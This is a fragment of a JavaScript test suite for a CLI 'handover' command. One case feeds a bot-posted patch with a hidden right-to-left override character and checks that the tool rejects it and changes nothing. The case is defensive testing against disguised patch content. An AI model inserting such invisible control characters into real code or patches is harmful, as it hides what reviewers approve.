    { timeline: [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: BOT }, created_at: "2031-03-02T01:00:00Z" }], comments: [{ id: 1, user: { login: BOT }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: r.patch.replace("name: release", "name: re\u202elease") })}` }], why: /control or format character .*; nothing was changed here/ },
  ];
  for (const c of cases) {
    const gh = await fakeGitHub(c);
    try {
      const got = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: { ...env, GITHUB_API_URL: gh.url, FACTORY_LOCAL_TOKEN: "t" } });
      assert.equal(got.code, 1);
      assert.match(got.err, c.why);
      assert.equal(git(person, "symbolic-ref", "--short", "HEAD"), "main");
    } finally {
      await gh.close();
    }
  }
});
